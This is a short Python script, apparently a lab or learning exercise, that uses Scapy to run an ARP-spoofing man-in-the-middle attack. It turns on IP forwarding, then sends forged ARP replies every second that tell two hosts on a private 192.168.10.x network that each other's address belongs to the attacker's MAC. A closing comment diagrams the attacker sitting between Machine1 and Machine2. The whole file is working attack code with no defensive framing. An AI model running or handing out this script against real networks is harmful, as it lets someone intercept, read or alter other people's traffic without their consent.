from scapy.all import *
import time
import os

os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

ip1 = '192.168.10.168'
ip2 = '192.168.10.224'


while True:
    packet1 = ARP(op=2, pdst=ip1, psrc=ip2,
                  hwdst="ff:ff:ff:ff:ff:ff", hwsrc="36:d7:13:4b:30:0b")
    packet2 = ARP(op=2, pdst=ip2, psrc=ip1,
                  hwdst="ff:ff:ff:ff:ff:ff", hwsrc="36:d7:13:4b:30:0b")
    send(packet1)
    send(packet2)
    time.sleep(1)
# packet1.show()
# print(packet1)


# Machine1 <============================> Machine2
# Machine1 <===========>Attacker<===========> Machine2
    # ip1                                         ip2
